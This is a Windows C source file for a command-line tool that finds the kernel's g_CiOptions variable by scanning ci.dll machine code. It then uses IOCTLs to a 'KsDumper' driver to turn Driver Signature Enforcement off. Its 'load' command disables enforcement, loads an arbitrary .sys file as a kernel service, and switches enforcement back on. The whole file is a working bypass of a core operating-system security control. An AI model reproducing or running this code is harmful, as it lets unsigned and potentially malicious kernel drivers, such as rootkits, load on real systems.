#pragma warning(disable:4819)
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

#define IO_READ_KERNEL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1728, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_DSE_SET_ADDR CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1730, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_DSE_DISABLE  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1731, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_DSE_ENABLE   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1732, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_DSE_QUERY    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1733, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define DSE_MAX_ADDRS 8

typedef NTSTATUS(NTAPI* PFN_NtQSI)(ULONG, PVOID, ULONG, PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags;
    USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} MY_MOD;
typedef struct { ULONG NumberOfModules; MY_MOD Modules[1]; } MY_MODS;
typedef struct { ULONG count; ULONG64 addresses[DSE_MAX_ADDRS]; ULONG originals[DSE_MAX_ADDRS]; } DSE_OP;
typedef struct { ULONG64 kernelAddress; PVOID bufferAddress; INT32 bufferSize; } KREAD;

static HANDLE hDev = INVALID_HANDLE_VALUE;

static HANDLE OpenDevice(void)
{
    HANDLE h = CreateFileW(L"\\\\.\\KsDumper", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) printf("[-] KsDumper not loaded (%d)\n", GetLastError());
    return h;
}

/*
 * KDU method: find g_CiOptions via CiInitialize export disassembly
 * 1. Map ci.dll in usermode
 * 2. Find CiInitialize export
 * 3. Disassemble to find call CipInitialize (E8 rel32)
 * 4. In CipInitialize, find mov [rip+disp], ecx (89 0D disp32)
 * 5. Calculate kernel address
 */
static ULONG64 FindCiOptionsKDU(void)
{
    PFN_NtQSI pNtQSI;
    MY_MODS* mods; ULONG size=0, i;
    ULONG64 ciKernBase = 0;
    char winDir[MAX_PATH], ciPath[MAX_PATH];
    HMODULE ciMap;
    PBYTE pCiInit, pCode;
    ULONG offset;
    LONG rel;
    ULONG64 result = 0;

    /* Find CI.dll kernel base */
    pNtQSI = (PFN_NtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    pNtQSI(11, NULL, 0, &size);
    mods = (MY_MODS*)malloc(size + 4096);
    pNtQSI(11, mods, size + 4096, &size);
    for (i = 0; i < mods->NumberOfModules; i++) {
        char* n = (char*)mods->Modules[i].FullPathName + mods->Modules[i].OffsetToFileName;
        if (_stricmp(n, "CI.dll") == 0 || _stricmp(n, "ci.dll") == 0) {
            ciKernBase = (ULONG64)(ULONG_PTR)mods->Modules[i].ImageBase;
            break;
        }
    }
    free(mods);
    if (!ciKernBase) { printf("[-] CI.dll not found\n"); return 0; }
    printf("[*] CI.dll kernel base: 0x%llX\n", ciKernBase);

    /* Map CI.dll in user mode */
    GetWindowsDirectoryA(winDir, MAX_PATH);
    sprintf_s(ciPath, MAX_PATH, "%s\\System32\\ci.dll", winDir);

    ciMap = LoadLibraryExA(ciPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!ciMap) { printf("[-] Cannot map ci.dll (%d)\n", GetLastError()); return 0; }
    printf("[*] CI.dll mapped at: 0x%p\n", ciMap);

    /* Find CiInitialize export */
    pCiInit = (PBYTE)GetProcAddress(ciMap, "CiInitialize");
    if (!pCiInit) { printf("[-] CiInitialize not found\n"); FreeLibrary(ciMap); return 0; }
    printf("[*] CiInitialize at: 0x%p\n", pCiInit);

    /*
     * Step 1: Dump CiInitialize bytes for analysis, then find call/jmp to CipInitialize
     */
    printf("[*] CiInitialize first 64 bytes:\n    ");
    for (offset = 0; offset < 64; offset++) {
        printf("%02X ", pCiInit[offset]);
        if ((offset & 15) == 15) printf("\n    ");
    }
    printf("\n");

    /* Scan for all E8 (call) and E9 (jmp) in CiInitialize */
    pCode = NULL;
    for (offset = 0; offset < 256; offset++) {
        PBYTE target;
        if (pCiInit[offset] == 0xE8) { /* call rel32 */
            rel = *(LONG*)(pCiInit + offset + 1);
            target = pCiInit + offset + 5 + rel;
            if (target > (PBYTE)ciMap && target < (PBYTE)ciMap + 0x200000) {
                printf("[*] CiInit+0x%02X: call -> 0x%p (in CI.dll)\n", offset, target);
                /* KDU logic: CipInitialize is called with 4+ params
                   Look for param setup before call: mov r8/r9/rcx/rdx patterns */
                if (!pCode) {
                    /* Check if 2+ register moves precede this call (param setup) */
                    int paramCount = 0;
                    int back;
                    for (back = 1; back < 20 && (int)offset - back >= 0; back++) {
                        BYTE b0 = pCiInit[offset - back];
                        BYTE b1 = (offset - back + 1 < 256) ? pCiInit[offset - back + 1] : 0;
                        /* 4C 8B xx = mov r8/r9/r10/r11, xxx */
                        if (b0 == 0x4C && b1 == 0x8B) paramCount++;
                        /* 48 8B xx = mov rax/rcx/rdx/rbx, xxx */
                        if (b0 == 0x48 && b1 == 0x8B) paramCount++;
                        /* 8B xx = mov ecx/edx, xxx */
                        if (b0 == 0x8B && (b1 == 0xCD || b1 == 0xD1 || b1 == 0xC1)) paramCount++;
                    }
                    if (paramCount >= 3) {
                        pCode = target;
                        printf("      -> selected (has %d param setup instrs)\n", paramCount);
                    }
                }
            } else {
                printf("[*] CiInit+0x%02X: call -> 0x%p (outside CI.dll, skip)\n", offset, target);
            }
        }
        if (pCiInit[offset] == 0xE9) { /* jmp rel32 */
            rel = *(LONG*)(pCiInit + offset + 1);
            target = pCiInit + offset + 5 + rel;
            if (target > (PBYTE)ciMap && target < (PBYTE)ciMap + 0x200000) {
                printf("[*] CiInit+0x%02X: jmp -> 0x%p (in CI.dll)\n", offset, target);
                if (!pCode) pCode = target;
            } else {
                printf("[*] CiInit+0x%02X: jmp -> 0x%p (outside, skip)\n", offset, target);
            }
        }
    }

    if (!pCode) {
        printf("[-] CipInitialize not found\n");
        FreeLibrary(ciMap);
        return 0;
    }

    printf("[*] Using CipInitialize at 0x%p\n", pCode);
    printf("[*] CipInitialize first 64 bytes:\n    ");
    for (offset = 0; offset < 64; offset++) {
        printf("%02X ", pCode[offset]);
        if ((offset & 15) == 15) printf("\n    ");
    }
    printf("\n");

    /*
     * Step 2: In CipInitialize, find mov to [rip+disp32]:
     *   89 0D xx xx xx xx  = mov [rip+disp], ecx
     *   89 05 xx xx xx xx  = mov [rip+disp], eax
     *   Any: 89 XX where (XX & 0xC7) == 0x05
     */
    for (offset = 0; offset < 1024; offset++) {
        if (pCode[offset] == 0x89 && (pCode[offset+1] & 0xC7) == 0x05) {
            rel = *(LONG*)(pCode + offset + 2);
            {
                PBYTE varAddr = pCode + offset + 6 + rel;
                ULONG64 kernAddr = ciKernBase + (varAddr - (PBYTE)ciMap);
                printf("[+] CipInit+0x%03X: mov [rip+0x%X] (kern=0x%llX)\n", offset, rel, kernAddr);
                if (!result) result = kernAddr; /* first one is g_CiOptions */
            }
        }
    }

    FreeLibrary(ciMap);

    if (!result) printf("[-] g_CiOptions pattern not found\n");
    return result;
}

static int CmdInit(void)
{
    ULONG64 addr = FindCiOptionsKDU();
    DSE_OP op = {0}; DWORD ret;
    if (!addr) return 1;
    hDev = OpenDevice(); if (hDev == INVALID_HANDLE_VALUE) return 1;
    op.count = 1;
    op.addresses[0] = addr;
    if (DeviceIoControl(hDev, IO_DSE_SET_ADDR, &op, sizeof(op), &op, sizeof(op), &ret, NULL))
        printf("[+] Set OK, %d addr(s), value=0x%X\n", op.count, op.originals[0]);
    else printf("[-] Set failed (%d)\n", GetLastError());
    CloseHandle(hDev); return 0;
}

static int CmdOff(void)
{
    DWORD ret; hDev = OpenDevice();
    if (hDev == INVALID_HANDLE_VALUE) return 1;
    if (DeviceIoControl(hDev, IO_DSE_DISABLE, NULL, 0, NULL, 0, &ret, NULL))
        printf("[+] DSE DISABLED\n");
    else printf("[-] Failed (%d)\n", GetLastError());
    CloseHandle(hDev); return 0;
}

static int CmdOn(void)
{
    DWORD ret; hDev = OpenDevice();
    if (hDev == INVALID_HANDLE_VALUE) return 1;
    if (DeviceIoControl(hDev, IO_DSE_ENABLE, NULL, 0, NULL, 0, &ret, NULL))
        printf("[+] DSE RESTORED\n");
    else printf("[-] Failed (%d)\n", GetLastError());
    CloseHandle(hDev); return 0;
}

static int CmdQuery(void)
{
    DSE_OP op = {0}; DWORD ret; ULONG i;
    hDev = OpenDevice(); if (hDev == INVALID_HANDLE_VALUE) return 1;
    if (DeviceIoControl(hDev, IO_DSE_QUERY, NULL, 0, &op, sizeof(op), &ret, NULL)) {
        printf("[*] %d address(es):\n", op.count);
        for (i = 0; i < op.count; i++)
            printf("  [%d] 0x%llX = 0x%X (%s)\n", i, op.addresses[i], op.originals[i],
                   op.originals[i] == 0 ? "DISABLED" : "ENABLED");
    } else printf("[-] Failed (%d)\n", GetLastError());
    CloseHandle(hDev); return 0;
}

static int LoadDrv(const char* p, const char* svc)
{
    SC_HANDLE scm, sv; SERVICE_STATUS ss; char fp[MAX_PATH];
    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) { printf("[-] SCM (%d)\n", GetLastError()); return 1; }
    sv = OpenServiceA(scm, svc, SERVICE_ALL_ACCESS);
    if (sv) { ControlService(sv, SERVICE_CONTROL_STOP, &ss); DeleteService(sv); CloseServiceHandle(sv); Sleep(500); }
    GetFullPathNameA(p, MAX_PATH, fp, NULL);
    sv = CreateServiceA(scm, svc, svc, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, fp, NULL, NULL, NULL, NULL, NULL);
    if (!sv && GetLastError() == ERROR_SERVICE_EXISTS) sv = OpenServiceA(scm, svc, SERVICE_ALL_ACCESS);
    if (!sv) { printf("[-] Create (%d)\n", GetLastError()); CloseServiceHandle(scm); return 1; }
    if (!StartServiceA(sv, 0, NULL) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
    { printf("[-] Start (%d)\n", GetLastError()); CloseServiceHandle(sv); CloseServiceHandle(scm); return 1; }
    printf("[+] Loaded: %s\n", fp);
    CloseServiceHandle(sv); CloseServiceHandle(scm); return 0;
}

int main(int argc, char* argv[])
{
    printf("=== DSE Control (KDU method) ===\n\n");
    if (argc < 2) {
        printf("  %s init             Find g_CiOptions via CiInitialize\n", argv[0]);
        printf("  %s query            Query status\n", argv[0]);
        printf("  %s off              Disable DSE\n", argv[0]);
        printf("  %s on               Restore DSE\n", argv[0]);
        printf("  %s load <file.sys>  Init+Off+Load+On\n", argv[0]);
        return 1;
    }
    if (_stricmp(argv[1], "init") == 0) return CmdInit();
    if (_stricmp(argv[1], "query") == 0) return CmdQuery();
    if (_stricmp(argv[1], "off") == 0) return CmdOff();
    if (_stricmp(argv[1], "on") == 0) return CmdOn();
    if (_stricmp(argv[1], "load") == 0 && argc >= 3) {
        const char* svc = argc >= 4 ? argv[3] : "hyperkd";
        int r;
        printf("[1] Init\n"); if (CmdInit()) return 1;
        printf("[2] Off\n"); if (CmdOff()) return 1;
        printf("[3] Load %s\n", argv[2]); r = LoadDrv(argv[2], svc);
        printf("[4] On\n"); CmdOn();
        return r;
    }
    printf("[-] Unknown: %s\n", argv[1]); return 1;
}
